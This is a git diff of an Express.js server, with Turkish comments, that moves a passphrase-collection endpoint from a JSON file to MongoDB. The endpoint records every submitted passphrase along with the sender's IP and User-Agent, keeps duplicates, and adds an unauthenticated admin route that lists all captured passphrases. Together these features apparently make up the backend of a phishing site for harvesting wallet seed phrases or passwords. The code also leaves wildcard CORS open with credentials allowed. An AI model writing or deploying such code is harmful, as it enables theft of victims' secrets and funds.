@@ -1,11 +1,20 @@
 const express = require('express');
 const path = require('path');
-const fs = require('fs');
+const mongoose = require('mongoose');
+const dotenv = require('dotenv');
+const Passphrase = require('./models/Passphrase');
+
+dotenv.config();
 const app = express();
 
-// CORS ayarlarını güncelle - production için domain'i değiştireceğiz
+// MongoDB bağlantısı
+mongoose.connect(process.env.MONGODB_URI)
+  .then(() => console.log('MongoDB connected'))
+  .catch(err => console.error('MongoDB connection error:', err));
+
+// CORS ve diğer middleware'ler
 app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*'); // Production'da spesifik domain'e değiştirilecek
+  res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
   res.header('Access-Control-Allow-Credentials', 'true');
@@ -16,44 +25,77 @@ app.use((req, res, next) => {
   next();
 });
 
-// JSON parser middleware
 app.use(express.json());
-
-// React build klasörünü statik dosyalar olarak sun
 app.use(express.static(path.join(__dirname, 'build')));
 
-// Passphrase'leri kaydetmek için endpoint
-app.post('/api/save-passphrase', (req, res) => {
+// Passphrase kaydetme endpoint'i
+app.post('/api/save-passphrase', async (req, res) => {
   const { passphrase } = req.body;
   
-  // Production'da dosya sistemi yerine veritabanı kullanmak daha güvenli olur
-  const dbPath = path.join(__dirname, 'passphrases.json');
-  
-  let passphrases = [];
   try {
-    if (fs.existsSync(dbPath)) {
-      const data = fs.readFileSync(dbPath, 'utf8');
-      passphrases = JSON.parse(data);
+    // Aynı passphrase'in daha önce kaydedilip kaydedilmediğini kontrol et
+    const existingPassphrase = await Passphrase.findOne({ passphrase });
+    
+    if (existingPassphrase) {
+      // Eğer aynı passphrase varsa, yeni bir uniqueId ile kaydet
+      const newPassphrase = new Passphrase({
+        passphrase,
+        ip: req.ip,
+        userAgent: req.get('User-Agent'),
+        uniqueId: Math.random().toString(36).substring(2) + Date.now().toString(36)
+      });
+      await newPassphrase.save();
+    } else {
+      // İlk kez kaydediliyorsa normal kaydet
+      const newPassphrase = new Passphrase({
+        passphrase,
+        ip: req.ip,
+        userAgent: req.get('User-Agent')
+      });
+      await newPassphrase.save();
     }
-  } catch (error) {
-    console.error('Error reading file:', error);
-  }
-  
-  passphrases.push({
-    passphrase,
-    timestamp: new Date().toISOString()
-  });
-  
-  try {
-    fs.writeFileSync(dbPath, JSON.stringify(passphrases, null, 2));
+
     res.json({ success: true });
   } catch (error) {
-    console.error('Error writing file:', error);
-    res.status(500).json({ success: false, error: 'Could not save passphrase' });
+    console.error('Error saving passphrase:', error);
+    
+    // MongoDB duplicate key hatası
+    if (error.code === 11000) {
+      // Tekrar dene
+      try {
+        const newPassphrase = new Passphrase({
+          passphrase,
+          ip: req.ip,
+          userAgent: req.get('User-Agent'),
+          uniqueId: Math.random().toString(36).substring(2) + Date.now().toString(36)
+        });
+        await newPassphrase.save();
+        res.json({ success: true });
+      } catch (retryError) {
+        res.status(500).json({ 
+          success: false, 
+          error: 'Could not save passphrase after retry' 
+        });
+      }
+    } else {
+      res.status(500).json({ 
+        success: false, 
+        error: 'Could not save passphrase' 
+      });
+    }
   }
 });
 
-// Tüm rotaları React app'e yönlendir
+// Admin endpoint'i - passphrases'leri görüntülemek için
+app.get('/api/admin/passphrases', async (req, res) => {
+  try {
+    const passphrases = await Passphrase.find().sort({ timestamp: -1 });
+    res.json(passphrases);
+  } catch (error) {
+    res.status(500).json({ error: 'Could not fetch passphrases' });
+  }
+});
+
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'build', 'index.html'));
 });
